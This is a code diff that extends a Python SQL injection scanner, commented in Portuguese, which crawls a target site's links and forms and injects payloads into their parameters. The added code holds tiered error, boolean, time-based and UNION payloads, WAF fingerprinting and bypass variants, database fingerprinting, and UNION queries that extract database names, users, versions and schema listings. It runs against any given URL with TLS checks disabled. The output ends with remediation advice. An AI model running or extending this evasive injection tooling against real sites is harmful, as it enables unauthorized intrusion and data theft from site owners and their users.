@@ -1023,24 +1023,109 @@ class SQLiScanner:
     def __init__(self, base_url, level=1, dbms=None):
         self.base_url = base_url
         self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
+        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
         self.vulnerable_points = []
         self.level = level
         self.dbms = dbms.lower() if dbms else None
+        self.waf_detected = None
+        self.db_fingerprint = None
+        self.confirmed_vulns = []
+        self.statistics = {
+            'total_tests': 0,
+            'vulnerabilities_found': 0,
+            'false_positives_filtered': 0,
+            'waf_bypasses': 0,
+            'confirmed_vulns': 0
+        }
+        
+        # Assinaturas de WAF/IPS
+        self.waf_signatures = {
+            'cloudflare': {
+                'headers': [r'cf-ray', r'cloudflare', r'__cfduid'],
+                'content': [r'cloudflare', r'attention required', r'checking your browser'],
+                'status_codes': [403, 503]
+            },
+            'akamai': {
+                'headers': [r'akamai', r'ghost'],
+                'content': [r'reference.*18\\..*\\.\\d+\\.\\d+'],
+                'status_codes': [403]
+            },
+            'aws_waf': {
+                'headers': [r'awselb', r'x-amzn'],
+                'content': [r'aws', r'request blocked'],
+                'status_codes': [403]
+            },
+            'mod_security': {
+                'headers': [r'mod_security', r'modsecurity'],
+                'content': [r'mod_security', r'not acceptable', r'reference id'],
+                'status_codes': [403, 406]
+            },
+            'imperva': {
+                'headers': [r'x-iinfo'],
+                'content': [r'imperva', r'incapsula'],
+                'status_codes': [403]
+            }
+        }
         
         # Payloads estruturados por tipo para serem ativados por nível
         self.payloads = {
-            "error_based": ["'", "\"", "')", "';", ";"],
+            "error_based": {
+                "basic": ["'", "\"", "')", "';", ";", "' AND 'x'='y"],
+                "intermediate": ["' /*comment*/ AND /*comment*/ 'x'='y", "'%20AND%20'x'='y", "' %0aAND%0a 'x'='y"],
+                "advanced": ["' /*!50000AND*/ 'x'='y", "'+%0d%0a+AND+%0d%0a+'x'='y", "'/**/AND/**/'x'='y"]
+            },
             "boolean_based": {
-                "true": ["' OR '1'='1", " OR 1=1", "' OR 1=1--", " OR 1=1--", "' OR 1=1#", " OR 1=1#"],
-                "false": ["' AND '1'='2", " AND 1=2", "' AND 1=2--", " AND 1=2--", "' AND 1=2#", " AND 1=2#"]
+                "true": {
+                    "basic": ["' OR '1'='1", " OR 1=1", "' OR 1=1--", " OR 1=1--", "' OR 1=1#", " OR 1=1#"],
+                    "evasive": ["' /*comment*/ OR /*comment*/ '1'='1", "' %0aOR%0a '1'='1", "'+OR+ASCII(SUBSTR((SELECT+database()),1,1))>0--"],
+                    "advanced": ["' /*!50000OR*/ '1'='1", "'||'1'='1", "' OR 'x'='x' AND 'y'='y"]
+                },
+                "false": {
+                    "basic": ["' AND '1'='2", " AND 1=2", "' AND 1=2--", " AND 1=2--", "' AND 1=2#", " AND 1=2#"],
+                    "evasive": ["' /*comment*/ AND /*comment*/ '1'='2", "' %0aAND%0a '1'='2", "'+AND+ASCII(SUBSTR((SELECT+database()),1,1))>200--"],
+                    "advanced": ["' /*!50000AND*/ '1'='2", "'&&'1'='2", "' AND 'x'='y' AND 'z'='w"]
+                }
             },
             "time_based": {
-                "mysql": "' AND SLEEP(5)--",
-                "postgresql": "' AND pg_sleep(5)--",
-                "mssql": "' WAITFOR DELAY '0:0:5'--",
-                "oracle": "' AND DBMS_LOCK.SLEEP(5)--",
-                "sqlite": "' AND LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--"
+                "mysql": {
+                    "basic": "' AND SLEEP(5)--",
+                    "evasive": "' /*comment*/ AND /*comment*/ SLEEP(5)--",
+                    "advanced": "' /*!50000AND*/ SLEEP(5)--"
+                },
+                "postgresql": {
+                    "basic": "' AND pg_sleep(5)--",
+                    "evasive": "' /*comment*/ AND /*comment*/ pg_sleep(5)--",
+                    "advanced": "' AND (SELECT pg_sleep(5))--"
+                },
+                "mssql": {
+                    "basic": "' WAITFOR DELAY '0:0:5'--",
+                    "evasive": "' /*comment*/ WAITFOR /*comment*/ DELAY '0:0:5'--",
+                    "advanced": "';WAITFOR DELAY '0:0:5'--"
+                },
+                "oracle": {
+                    "basic": "' AND DBMS_LOCK.SLEEP(5)--",
+                    "evasive": "' /*comment*/ AND /*comment*/ DBMS_LOCK.SLEEP(5)--",
+                    "advanced": "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)--"
+                },
+                "sqlite": {
+                    "basic": "' AND LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
+                    "evasive": "' /*comment*/ AND /*comment*/ LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
+                    "advanced": "' AND (SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2)))))--"
+                }
+            },
+            "union_based": {
+                "detection": ["' UNION SELECT NULL--", "' UNION ALL SELECT NULL--", "'+UNION+SELECT+NULL--"],
+                "column_enum": [
+                    "' UNION SELECT NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+                ],
+                "data_extraction": [
+                    "' UNION SELECT database(),user()--",
+                    "' UNION SELECT version(),@@version_comment--",
+                    "' UNION SELECT table_name,column_name FROM information_schema.columns--"
+                ]
             }
         }
         self.error_patterns = {
@@ -1064,30 +1149,243 @@ class SQLiScanner:
     def _add_finding(self, risk, v_type, detail, recommendation):
         """Adiciona uma nova descoberta, evitando duplicados."""
         finding = {"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation}
-        if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
-
-    def _test_param(self, url, param, original_value, method, form_data=None):
-        """Testa um único parâmetro com base no nível de scan definido."""
-        if self.level >= 1:
-            if self._test_error_based(url, param, original_value, method, form_data): return
-        if self.level >= 2:
-            if self._test_boolean_based(url, param, original_value, method, form_data): return
-        if self.level >= 3:
-            if self._test_time_based(url, param, original_value, method, form_data): return
-
-    def _test_error_based(self, url, param, original_value, method, form_data=None):
-        """Testa a injeção baseada em erros."""
-        for payload in self.payloads["error_based"]:
+        if finding not in self.vulnerable_points: 
+            self.vulnerable_points.append(finding)
+            self.statistics['vulnerabilities_found'] += 1
+    
+    def _detect_waf(self, response):
+        """Detecta presença de WAF baseado em headers, conteúdo e status codes."""
+        if not response:
+            return None
+            
+        response_headers = ' '.join([f'{k}: {v}' for k, v in response.headers.items()]).lower()
+        response_content = response.text.lower()
+        status_code = response.status_code
+        
+        for waf_name, signatures in self.waf_signatures.items():
+            # Verifica headers
+            for header_pattern in signatures['headers']:
+                if re.search(header_pattern, response_headers, re.IGNORECASE):
+                    return waf_name
+            
+            # Verifica conteúdo
+            for content_pattern in signatures['content']:
+                if re.search(content_pattern, response_content, re.IGNORECASE):
+                    return waf_name
+            
+            # Verifica status codes
+            if status_code in signatures['status_codes']:
+                # Confirma com padrões de conteúdo se disponível
+                if signatures['content'] and any(re.search(pattern, response_content, re.IGNORECASE) 
+                                               for pattern in signatures['content']):
+                    return waf_name
+        
+        return None
+    
+    def _test_waf_bypass(self, url, param, original_value, method, form_data=None):
+        """Testa técnicas de bypass de WAF."""
+        bypass_techniques = [
+            "' /*comment*/ OR /*comment*/ '1'='1",
+            "' /*!50000OR*/ '1'='1",
+            "' %0aOR%0a '1'='1",
+            "'+OR+ASCII(SUBSTR((SELECT+database()),1,1))>0--",
+            "'/**/OR/**/'1'='1",
+            "' OR 'x'='x' AND 'y'='y"
+        ]
+        
+        for technique in bypass_techniques:
+            test_value = (original_value or "") + technique
+            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+            
+            try:
+                if method.lower() == 'get':
+                    response = self.session.get(url, params=data, timeout=7, verify=False)
+                else:
+                    response = self.session.post(url, data=data, timeout=7, verify=False)
+                
+                # Se não há bloqueio (status 200), é um possível bypass
+                if response.status_code == 200:
+                    waf = self._detect_waf(response)
+                    if not waf:  # WAF não detectado = possível bypass
+                        self.statistics['waf_bypasses'] += 1
+                        return technique, response
+                        
+            except requests.exceptions.RequestException:
+                continue
+        
+        return None, None
+    
+    def _confirm_vulnerability(self, url, param, original_value, method, form_data, payload_type, payload):
+        """Confirma vulnerabilidade com múltiplos testes."""
+        confirmations = 0
+        tests = 3
+        
+        for i in range(tests):
+            test_value = (original_value or "") + payload
+            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+            content, duration = self._get_page_content(url, method=method, data=data)
+            
+            if content:
+                if payload_type == "error_based":
+                    for db, pattern in self.error_patterns.items():
+                        if re.search(pattern, content, re.IGNORECASE):
+                            confirmations += 1
+                            break
+                elif payload_type == "time_based":
+                    if duration > 4.5:
+                        confirmations += 1
+                # Adicionar outras confirmações conforme necessário
+        
+        # Considera confirmado se 2 de 3 testes passarem
+        if confirmations >= 2:
+            self.statistics['confirmed_vulns'] += 1
+            return True
+        else:
+            self.statistics['false_positives_filtered'] += 1
+            return False
+    
+    def _fingerprint_database(self, url, param, original_value, method, form_data=None):
+        """Tenta identificar o tipo de banco de dados."""
+        fingerprint_tests = {
+            'mysql': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+            'postgresql': "' AND (SELECT COUNT(*) FROM pg_tables)>0--", 
+            'mssql': "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
+            'oracle': "' AND (SELECT COUNT(*) FROM all_tables)>0--",
+            'sqlite': "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
+        }
+        
+        for db_type, test_payload in fingerprint_tests.items():
+            test_value = (original_value or "") + test_payload
+            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+            content, _ = self._get_page_content(url, method=method, data=data)
+            
+            if content and not any(re.search(pattern, content, re.IGNORECASE) 
+                                 for pattern in self.error_patterns.values()):
+                return db_type
+        
+        return None
+    
+    def _test_union_based(self, url, param, original_value, method, form_data=None):
+        """Testa injeção UNION-based SQL."""
+        # Primeiro, detecta o número de colunas
+        columns_detected = 0
+        
+        for col_count in range(1, 10):  # Testa até 10 colunas
+            payload = f"' UNION SELECT {','.join(['NULL'] * col_count)}--"
             test_value = (original_value or "") + payload
             data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
             content, _ = self._get_page_content(url, method=method, data=data)
+            
             if content:
-                # Se um DBMS específico for alvo, apenas verifica os seus padrões de erro
-                db_patterns = {self.dbms: self.error_patterns[self.dbms]} if self.dbms and self.dbms in self.error_patterns else self.error_patterns
-                for db, pattern in db_patterns.items():
+                # Se não há erro, provavelmente encontrou o número correto de colunas
+                error_found = False
+                for pattern in self.error_patterns.values():
                     if re.search(pattern, content, re.IGNORECASE):
-                        self._add_finding("Alto", "SQL Injection", f"Parâmetro '{param}' em {url} ({method.upper()})", f"Técnica: Error-Based. Payload: '{payload}'. BD Provável: {db.capitalize()}")
+                        error_found = True
+                        break
+                
+                if not error_found:
+                    columns_detected = col_count
+                    break
+        
+        if columns_detected > 0:
+            # Tenta extrair informações usando UNION
+            extraction_payloads = [
+                f"' UNION SELECT {','.join(['NULL'] * (columns_detected-2) + ['database()', 'user()'])}--",
+                f"' UNION SELECT {','.join(['NULL'] * (columns_detected-2) + ['version()', '@@version_comment'])}--",
+                f"' UNION SELECT {','.join(['NULL'] * (columns_detected-1) + ['table_name'])} FROM information_schema.tables--"
+            ]
+            
+            for payload in extraction_payloads:
+                test_value = (original_value or "") + payload
+                data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+                content, _ = self._get_page_content(url, method=method, data=data)
+                
+                if content and 'null' not in content.lower():
+                    # Confirma a vulnerabilidade
+                    if self._confirm_vulnerability(url, param, original_value, method, form_data, "union_based", payload):
+                        self._add_finding("Alto", "SQL Injection", 
+                                        f"Parâmetro '{param}' em {url} ({method.upper()})", 
+                                        f"Técnica: UNION-Based. Colunas detectadas: {columns_detected}. Payload: '{payload}'")
                         return True
+        
+        return False
+
+    def _test_param(self, url, param, original_value, method, form_data=None):
+        """Testa um único parâmetro com base no nível de scan definido."""
+        self.statistics['total_tests'] += 1
+        
+        # Detecção inicial de WAF com payload simples
+        test_response = None
+        try:
+            if method.lower() == 'get':
+                test_response = self.session.get(url, params={param: original_value + "'"}, timeout=7, verify=False)
+            else:
+                test_response = self.session.post(url, data={**(form_data or {}), param: original_value + "'"}, timeout=7, verify=False)
+            
+            if test_response:
+                detected_waf = self._detect_waf(test_response)
+                if detected_waf and not self.waf_detected:
+                    self.waf_detected = detected_waf
+                    console.print(f"[bold yellow]⚠️  WAF Detectado: {detected_waf.upper()}[/bold yellow]")
+        except:
+            pass
+        
+        # Tenta fingerprinting do banco se não foi especificado
+        if not self.db_fingerprint and not self.dbms:
+            self.db_fingerprint = self._fingerprint_database(url, param, original_value, method, form_data)
+            if self.db_fingerprint:
+                console.print(f"[bold cyan]🔍 Banco identificado: {self.db_fingerprint.upper()}[/bold cyan]")
+        
+        # Nível 1: Error-based
+        if self.level >= 1:
+            if self._test_error_based(url, param, original_value, method, form_data): 
+                return
+        
+        # Nível 2: Boolean-based e UNION-based
+        if self.level >= 2:
+            if self._test_boolean_based(url, param, original_value, method, form_data): 
+                return
+            if self._test_union_based(url, param, original_value, method, form_data):
+                return
+        
+        # Nível 3: Time-based
+        if self.level >= 3:
+            if self._test_time_based(url, param, original_value, method, form_data): 
+                return
+        
+        # Se WAF foi detectado, tenta bypass
+        if self.waf_detected and self.level >= 2:
+            bypass_payload, bypass_response = self._test_waf_bypass(url, param, original_value, method, form_data)
+            if bypass_payload:
+                console.print(f"[bold green]✅ WAF Bypass encontrado: {bypass_payload[:50]}...[/bold green]")
+                # Re-testa com payloads evasivos após bypass
+                self._test_error_based(url, param, original_value, method, form_data, use_evasive=True)
+
+    def _test_error_based(self, url, param, original_value, method, form_data=None, use_evasive=False):
+        """Testa a injeção baseada em erros com payloads básicos e evasivos."""
+        payload_sets = ['basic']
+        if use_evasive or self.waf_detected:
+            payload_sets.extend(['intermediate', 'advanced'])
+        
+        for payload_type in payload_sets:
+            for payload in self.payloads["error_based"][payload_type]:
+                test_value = (original_value or "") + payload
+                data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+                content, _ = self._get_page_content(url, method=method, data=data)
+                
+                if content:
+                    # Se um DBMS específico for alvo, apenas verifica os seus padrões de erro
+                    db_patterns = {self.dbms: self.error_patterns[self.dbms]} if self.dbms and self.dbms in self.error_patterns else self.error_patterns
+                    for db, pattern in db_patterns.items():
+                        if re.search(pattern, content, re.IGNORECASE):
+                            # Confirma a vulnerabilidade
+                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "error_based", payload):
+                                evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
+                                self._add_finding("Alto", "SQL Injection", 
+                                                f"Parâmetro '{param}' em {url} ({method.upper()})", 
+                                                f"Técnica: Error-Based{evasion_info}. Payload: '{payload}'. BD Provável: {db.capitalize()}")
+                                return True
         return False
 
     def _test_boolean_based(self, url, param, original_value, method, form_data=None):
@@ -1096,50 +1394,94 @@ class SQLiScanner:
         original_content, _ = self._get_page_content(url, method=method, data=original_data)
         if not original_content: return False
         
-        for payload in self.payloads["boolean_based"]["true"]:
-            test_value = (original_value or "") + payload
-            true_data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
-            true_content, _ = self._get_page_content(url, method=method, data=true_data)
+        payload_sets = ['basic']
+        if self.waf_detected:
+            payload_sets.extend(['evasive', 'advanced'])
+        
+        for payload_type in payload_sets:
+            for payload in self.payloads["boolean_based"]["true"][payload_type]:
+                test_value = (original_value or "") + payload
+                true_data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+                true_content, _ = self._get_page_content(url, method=method, data=true_data)
             
-            if true_content and SequenceMatcher(None, original_content, true_content).ratio() > 0.95:
-                for false_payload in self.payloads["boolean_based"]["false"]:
-                    false_test_value = (original_value or "") + false_payload
-                    false_data = {param: false_test_value} if method == 'get' else {**(form_data or {}), param: false_test_value}
-                    false_content, _ = self._get_page_content(url, method=method, data=false_data)
-                    
-                    if false_content and SequenceMatcher(None, original_content, false_content).ratio() < 0.9:
-                        self._add_finding("Alto", "SQL Injection", f"Parâmetro '{param}' em {url} ({method.upper()})", f"Técnica: Boolean-Based. Payload: '{payload}'")
-                        return True
+                if true_content and SequenceMatcher(None, original_content, true_content).ratio() > 0.95:
+                    for false_payload in self.payloads["boolean_based"]["false"][payload_type]:
+                        false_test_value = (original_value or "") + false_payload
+                        false_data = {param: false_test_value} if method == 'get' else {**(form_data or {}), param: false_test_value}
+                        false_content, _ = self._get_page_content(url, method=method, data=false_data)
+                        
+                        if false_content and SequenceMatcher(None, original_content, false_content).ratio() < 0.9:
+                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "boolean_based", payload):
+                                evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
+                                self._add_finding("Alto", "SQL Injection", 
+                                                f"Parâmetro '{param}' em {url} ({method.upper()})", 
+                                                f"Técnica: Boolean-Based{evasion_info}. Payload: '{payload}'")
+                                return True
         return False
 
     def _test_time_based(self, url, param, original_value, method, form_data=None):
-        """Testa a injeção cega baseada em tempo."""
-        payloads_to_test = {}
-        if self.dbms:
-            if self.dbms in self.payloads["time_based"]:
-                payloads_to_test[self.dbms] = self.payloads["time_based"][self.dbms]
+        """Testa a injeção cega baseada em tempo com payloads evasivos."""
+        # Determina quais bancos testar
+        databases_to_test = {}
+        if self.dbms and self.dbms in self.payloads["time_based"]:
+            databases_to_test[self.dbms] = self.payloads["time_based"][self.dbms]
+        elif self.db_fingerprint and self.db_fingerprint in self.payloads["time_based"]:
+            databases_to_test[self.db_fingerprint] = self.payloads["time_based"][self.db_fingerprint]
         else:
-            payloads_to_test = self.payloads["time_based"]
+            databases_to_test = self.payloads["time_based"]
 
-        for db, payload_template in payloads_to_test.items():
-            test_value = (original_value or "") + payload_template
-            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
-            _, duration = self._get_page_content(url, method=method, data=data, timeout=10)
-            
-            if duration > 4.5: # Menor que o sleep para contar com a latência
-                self._add_finding("Alto", "SQL Injection", f"Parâmetro '{param}' em {url} ({method.upper()})", f"Técnica: Time-Based Blind. Payload: '{payload_template}'. BD Provável: {db.capitalize()}")
-                return True
+        # Determina tipos de payload
+        payload_types = ['basic']
+        if self.waf_detected:
+            payload_types.extend(['evasive', 'advanced'])
+
+        for db, payload_dict in databases_to_test.items():
+            for payload_type in payload_types:
+                if payload_type in payload_dict:
+                    payload_template = payload_dict[payload_type]
+                    test_value = (original_value or "") + payload_template
+                    data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
+                    _, duration = self._get_page_content(url, method=method, data=data, timeout=10)
+                    
+                    if duration > 4.5:  # Menor que o sleep para contar com a latência
+                        if self._confirm_vulnerability(url, param, original_value, method, form_data, "time_based", payload_template):
+                            evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
+                            self._add_finding("Alto", "SQL Injection", 
+                                            f"Parâmetro '{param}' em {url} ({method.upper()})", 
+                                            f"Técnica: Time-Based Blind{evasion_info}. Payload: '{payload_template}'. BD Provável: {db.capitalize()}")
+                            return True
         return False
 
     def run_scan(self, return_findings=False):
         """Executa o scan de SQLi, descobrindo pontos de entrada e testando-os."""
         if not return_findings:
-            console.print("-" * 60)
-            console.print(f"[*] Executando scanner de SQL Injection em: [bold cyan]{self.base_url}[/bold cyan]")
-            console.print(f"[*] Nível de Scan: [bold cyan]{self.level}[/bold cyan]")
+            console.print("\n[bold cyan]═══ SCANNER SQL INJECTION AVANÇADO ═══[/bold cyan]")
+            
+            # Tabela de configuração
+            config_table = Table(title="Configuração do Scan", show_header=True, header_style="bold magenta")
+            config_table.add_column("Parâmetro", style="cyan", width=15)
+            config_table.add_column("Valor", style="yellow", width=30)
+            config_table.add_column("Descrição", style="white", width=25)
+            
+            config_table.add_row("URL Alvo", self.base_url, "Site para análise")
+            config_table.add_row("Nível", str(self.level), f"1=Error, 2=Boolean+Union, 3=Time")
+            
             if self.dbms:
-                console.print(f"[*] DBMS Alvo: [bold cyan]{self.dbms}[/bold cyan]")
-            console.print("-" * 60)
+                config_table.add_row("DBMS Alvo", self.dbms.upper(), "Banco específico")
+            else:
+                config_table.add_row("DBMS Alvo", "Auto-detect", "Detecção automática")
+            
+            techniques = []
+            if self.level >= 1: techniques.append("Error-based")
+            if self.level >= 2: techniques.extend(["Boolean-based", "UNION-based"])
+            if self.level >= 3: techniques.append("Time-based")
+            
+            config_table.add_row("Técnicas", ", ".join(techniques), "Métodos de teste")
+            config_table.add_row("WAF Bypass", "Ativado", "Payloads evasivos")
+            config_table.add_row("Confirmação", "3 tentativas", "Anti-falso positivo")
+            
+            console.print(config_table)
+            console.print()
         try:
             with console.status("[bold green]Coletando pontos de entrada (links e formulários)...[/bold green]"):
                 response = self.session.get(self.base_url, timeout=10, verify=False)
@@ -1178,17 +1520,68 @@ class SQLiScanner:
         self._present_findings()
 
     def _present_findings(self):
-        """Apresenta os resultados do scan de SQLi."""
-        console.print("-" * 60)
+        """Apresenta os resultados do scan de SQLi com estatísticas detalhadas."""
+        console.print("\n[bold cyan]═══ RESULTADOS DO SCAN ═══[/bold cyan]")
+        
+        # Estatísticas do scan
+        stats_table = Table(title="Estatísticas do Scan", show_header=True, header_style="bold yellow")
+        stats_table.add_column("Métrica", style="cyan", width=25)
+        stats_table.add_column("Valor", style="yellow", width=15)
+        stats_table.add_column("Descrição", style="white", width=30)
+        
+        stats_table.add_row("Testes Realizados", str(self.statistics['total_tests']), "Total de parâmetros testados")
+        stats_table.add_row("Vulnerabilidades", str(self.statistics['vulnerabilities_found']), "SQLi encontradas")
+        stats_table.add_row("Confirmadas", str(self.statistics['confirmed_vulns']), "Vulnerabilidades confirmadas")
+        stats_table.add_row("Falsos Positivos", str(self.statistics['false_positives_filtered']), "Filtrados pela confirmação")
+        
+        if self.waf_detected:
+            stats_table.add_row("WAF Detectado", self.waf_detected.upper(), "Firewall de aplicação web")
+            stats_table.add_row("Bypasses WAF", str(self.statistics['waf_bypasses']), "Técnicas que passaram pelo WAF")
+        
+        if self.db_fingerprint:
+            stats_table.add_row("Banco Identificado", self.db_fingerprint.upper(), "Sistema de banco de dados")
+        
+        console.print(stats_table)
+        console.print()
+        
+        # Resultados de vulnerabilidades
         if not self.vulnerable_points:
-            console.print("[bold green][+] Nenhuma vulnerabilidade de SQL Injection foi encontrada.[/bold green]")
+            console.print("[bold green]✅ NENHUMA VULNERABILIDADE ENCONTRADA[/bold green]")
+            console.print("[green]O site aparenta estar protegido contra SQL Injection[/green]")
         else:
-            table = Table(title="Potenciais Vulnerabilidades de SQL Injection Encontradas")
-            table.add_column("Detalhe", style="cyan")
-            table.add_column("Recomendação", style="white")
-            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
-            console.print(table)
-        console.print("-" * 60)
+            console.print(f"[bold red]🚨 {len(self.vulnerable_points)} VULNERABILIDADE(S) ENCONTRADA(S)[/bold red]")
+            
+            vuln_table = Table(title="Vulnerabilidades de SQL Injection Detectadas", show_header=True, header_style="bold red")
+            vuln_table.add_column("Risco", justify="center", style="bold red", width=8)
+            vuln_table.add_column("Tipo", style="magenta", width=15)
+            vuln_table.add_column("Localização", style="cyan", width=40)
+            vuln_table.add_column("Técnica & Payload", style="yellow", width=50)
+            vuln_table.add_column("Recomendação", style="white", width=35)
+            
+            for finding in self.vulnerable_points:
+                vuln_table.add_row(
+                    finding['Risco'],
+                    finding['Tipo'], 
+                    finding['Detalhe'],
+                    finding['Recomendação'].split('.')[0] if '.' in finding['Recomendação'] else finding['Recomendação'][:50],
+                    "Usar prepared statements e validação de entrada"
+                )
+            
+            console.print(vuln_table)
+            
+            # Recomendações gerais
+            console.print("\n[bold yellow]🛡️  RECOMENDAÇÕES DE SEGURANÇA:[/bold yellow]")
+            recommendations = [
+                "1. Use prepared statements/parametrized queries",
+                "2. Implemente validação rigorosa de entrada",
+                "3. Configure um WAF (Web Application Firewall)",
+                "4. Aplique o princípio do menor privilégio no banco",
+                "5. Mantenha o sistema de banco atualizado"
+            ]
+            for rec in recommendations:
+                console.print(f"   [white]{rec}[/white]")
+        
+        console.print(f"\n[bold cyan]{'═' * 60}[/bold cyan]")
 
 def sql_injection_scan(url, level=1, dbms=None):
     SQLiScanner(url, level=level, dbms=dbms).run_scan()
